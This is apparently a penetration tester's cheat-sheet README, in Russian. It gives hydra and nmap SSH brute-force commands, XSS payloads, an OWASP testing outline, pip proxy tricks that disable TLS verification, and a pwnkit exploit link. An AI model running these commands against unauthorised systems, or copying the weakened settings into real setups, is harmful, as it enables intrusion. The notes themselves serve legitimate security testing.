![image](https://github.com/MRagulin/tools/assets/26712092/9d953e60-a437-4592-870f-b46dc0ca5663)Скрипты автоматизации
====
## SSH
Проблема подключения putty к SSH через ключ

```
echo ‘PubkeyAcceptedAlgorithms +ssh-rsa’ >> /etc/ssh/sshd_config
```
Перебор паролей:

```
hydra -V -f -t 4 -l root -P pass.txt ssh://172.16.60.1
```

```
nmap -p22 --script=ssh-brute --script-args userdb=users.txt,passdb=pass.txt 172.16.60.1
```


## Веб
Методология OWASP

1. сбор информации (Краулинг) nmap, dnscan, google, whatweb, burp spider
2. тестирование конфигурации (dirbuster, http method, )
3. тестирование механизмов идентификации (burp+secList)
4. тестирование механизмов аутентификации (Recovery)
5. тестирование механизмов авторизации (DirTraversal, Id Inc, FileBrute)
6. тестирование механизмов управления сессиями (Cookie, CSRF)
7. тестирование валидации входных данных (XSS, SQLi, XML, LDAP, XPATH, HTTP-Splitting)
8. тестирование обработки ошибок (ERROR handle)
9. тестирование на предмет некриптостойкого шифрования (SSL/TLS)
10. тестирование бизнес-логики приложения (Валидация данных, бизнес-логики, загрузка данных)
11. тестирование механизмов безопасности клиентской части(XSS,JavaScript-инъекции, Clickjacking, WebSockets;)

Межсайтовый скриптинг:

```
"><img src=# onerror="alert(xss)">
"><script>alert(1)</script>
<img src=x onerror=alert(1)/>
<svg onload=alert('XSS')>
1"--><svg/onload=';alert(0);'>

```

## Python   
Проблема установки пакетов pip в корпоративной среде, варианты решения:
1. export HTTPS_PROXY=https://172.16.70.1:8888/ && export HTTP_PROXY=http://172.16.70.1:8888/ или set HTTPS_PROXY=https://172.16.70.1:8888/  && set HTTP_PROXY=http://172.16.70.1:8888/
2. pip3 install GitPython --proxy="https://172.16.70.1:8888" --global http.sslVerify false --trusted-host 172.16.70.1 --trusted-host pypi.org --trusted-host files.pythonhosted.org --trusted-host 172.16.70.1
3. pip install --index-url https://user:pass@nexus.company.local/repository/Python-group/simple GitPython


## Повышение привилегий
**Linux** pwnkit --  https://github.com/PwnFunction/CVE-2021-4034 

